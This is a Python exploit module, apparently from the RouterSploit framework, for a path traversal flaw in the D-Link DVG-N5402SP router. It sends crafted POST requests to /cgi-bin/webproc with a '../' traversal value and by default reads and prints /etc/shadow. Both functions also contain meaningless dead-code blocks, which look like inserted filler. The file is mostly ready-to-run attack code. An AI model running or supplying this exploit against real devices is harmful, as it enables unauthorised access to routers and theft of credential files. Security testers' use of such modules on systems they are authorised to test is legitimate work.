from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'D-Link DVG-N5402SP Path Traversal', 'description': 'Module exploits D-Link DVG-N5402SP path traversal vulnerability, which allows reading files form the device.', 'authors': ('Karn Ganeshen', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://www.exploit-db.com/exploits/39409/', 'http://ipositivesecurity.blogspot.com/2016/02/dlink-dvgn5402sp-multiple-vuln.html'), 'devices': ('D-Link DVG-N5402SP',)}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(8080, 'Target HTTP port')
    filename = OptString('/etc/shadow', 'File to read')

    def run(self):
        if False:
            while True:
                i = 10
        data = {'getpage': 'html/index.html', '*errorpage*': '../../../../../../../../../../..{}'.format(self.filename), 'var%3Amenu': 'setup', 'var%3Apage': 'connected', 'var%': '', 'objaction': 'auth', '%3Ausername': 'blah', '%3Apassword': 'blah', '%3Aaction': 'login', '%3Asessionid': 'abcdefgh'}
        response = self.http_request(method='POST', path='/cgi-bin/webproc', data=data)
        if response is None:
            return
        if response.status_code == 200:
            print_success('Exploit success')
            print_status('File: {}'.format(self.filename))
            print_info(response.text)
        else:
            print_error('Exploit failed')

    @mute
    def check(self):
        if False:
            for i in range(10):
                print('nop')
        data = {'getpage': 'html/index.html', '*errorpage*': '../../../../../../../../../../../etc/shadow', 'var%3Amenu': 'setup', 'var%3Apage': 'connected', 'var%': '', 'objaction': 'auth', '%3Ausername': 'blah', '%3Apassword': 'blah', '%3Aaction': 'login', '%3Asessionid': 'abcdefgh'}
        response = self.http_request(method='POST', path='/cgi-bin/webproc', data=data)
        if response and utils.detect_file_content(response.text, '/etc/shadow'):
            return True
        return False